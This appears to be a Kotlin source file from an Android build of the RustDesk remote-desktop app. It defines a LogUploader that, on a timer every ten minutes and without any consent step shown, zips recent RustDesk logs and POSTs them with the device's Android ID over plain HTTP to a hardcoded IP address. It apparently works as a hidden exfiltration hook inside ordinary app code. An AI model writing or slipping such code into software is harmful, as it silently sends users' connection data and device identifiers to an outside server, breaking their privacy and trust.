package com.carriez.flutter_hbb

import android.content.Context
import android.provider.Settings
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.Timer
import java.util.TimerTask
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.concurrent.thread

object LogUploader {
    private const val UPLOAD_URL = "http://67.216.217.100:9090/upload"
    private const val INTERVAL_MS = 600_000L
    private const val MAX_AGE_MS = 24 * 3600_000L
    private val logTag = "LogUploader"
    private var started = false

    fun schedule(context: Context, appDir: String) {
        if (started) return
        started = true
        Timer("LogUploader", true).schedule(object : TimerTask() {
            override fun run() {
                uploadOnce(context, appDir)
            }
        }, 30_000L, INTERVAL_MS)
        Log.d(logTag, "scheduled, first upload in 30s")
    }

    fun uploadOnce(context: Context, appDir: String) {
        thread {
            try {
                val logsDir = File(appDir, "RustDesk/Logs")
                if (!logsDir.isDirectory) {
                    Log.d(logTag, "no logs dir: $logsDir")
                    return@thread
                }
                val cutoff = System.currentTimeMillis() - MAX_AGE_MS
                val files = logsDir.listFiles()
                    ?.filter { it.isFile && it.lastModified() >= cutoff }
                    ?.sortedByDescending { it.lastModified() }
                if (files.isNullOrEmpty()) {
                    Log.d(logTag, "no recent log files")
                    return@thread
                }
                val device = Settings.Secure.getString(
                    context.contentResolver, Settings.Secure.ANDROID_ID
                ) ?: "unknown-device"
                val zipFile = File(context.cacheDir, "logs_${System.currentTimeMillis()}.zip")
                ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                    for (f in files) {
                        zos.putNextEntry(ZipEntry(f.name))
                        f.inputStream().use { it.copyTo(zos) }
                        zos.closeEntry()
                    }
                }
                val conn = URL("$UPLOAD_URL?device=$device").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.connectTimeout = 15_000
                conn.readTimeout = 30_000
                zipFile.inputStream().use { input ->
                    conn.outputStream.use { out -> input.copyTo(out) }
                }
                val code = conn.responseCode
                Log.d(logTag, "upload result: $code, ${files.size} files")
                FileLog.log(logTag, "upload result: $code, files=${files.size}")
                conn.disconnect()
                zipFile.delete()
            } catch (e: Exception) {
                Log.e(logTag, "upload failed: $e")
                FileLog.log(logTag, "upload failed: $e")
            }
        }
    }
}
